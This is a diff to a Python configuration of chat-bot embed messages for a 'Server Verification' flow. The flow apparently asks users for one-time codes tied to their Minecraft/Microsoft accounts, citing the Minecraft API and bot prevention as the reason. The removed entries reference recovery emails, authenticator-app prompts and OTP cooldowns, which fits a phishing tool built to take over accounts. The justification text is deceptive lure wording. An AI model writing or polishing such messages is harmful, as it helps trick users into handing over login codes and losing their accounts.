@@ -1,3 +1,4 @@
+# Verification embeds | title / description 
 embeds = {
     "default_embed": [
         "Server Verification",
@@ -15,25 +16,5 @@ embeds = {
     Q: Why do you need to collect a code?
     A: The code confirms with the Minecraft API that you truly own the account you’re verifying, it is required to verify because we are dealing with bots daily.
         """
-    ],
-    "failed_otp": [
-        "Security Email Required",
-        "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
-    ],
-    "failed_auth": [
-        ":x: Failed to verify",
-        "You pressed the wrong number on your authenticator app. Try again!"
-    ],
-    "timeout_auth": [
-        ":x: Failed to verify",
-        "You took too long to verify in your authenticator app. Try again!"
-    ],
-    "cooldown_otp": [
-        ":x: Failed to verify",
-        "Please wait a few minutes before trying to verify again! Our system is handling many verifications at once."
-    ],
-    "invalid_email": [
-        ":x: Failed to verify",
-        "The email you entered does not exist, make sure you entered it correctly!"
     ]
 }
